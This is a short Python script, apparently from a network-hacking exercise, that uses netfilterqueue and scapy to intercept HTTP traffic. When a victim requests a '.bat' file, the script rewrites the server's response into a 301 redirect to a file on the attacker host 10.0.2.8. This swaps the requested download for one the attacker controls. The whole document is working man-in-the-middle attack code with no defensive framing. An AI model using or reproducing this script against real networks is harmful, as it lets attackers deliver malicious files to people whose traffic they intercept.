import netfilterqueue
import scapy.all as scapy
ack_list=[]
def process_packet(packet):
	scapy_packet=scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport==80:
			print("Request made")
			if ".bat" in scapy_packet[scapy.Raw].load:
				ack_list.append(scapy_packet[scapy.TCP].ack)
				print(scapy_packet.show())
		elif scapy_packet[scapy.TCP].sport==80:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation:http://10.0.2.8/hiiiii.py\n\n "
				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum
				del scapy_packet[scapy.TCP].chksum
				print(scapy_packet.show())
				packet.set_payload(str(scapy_packet))
	packet.accept()	
queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
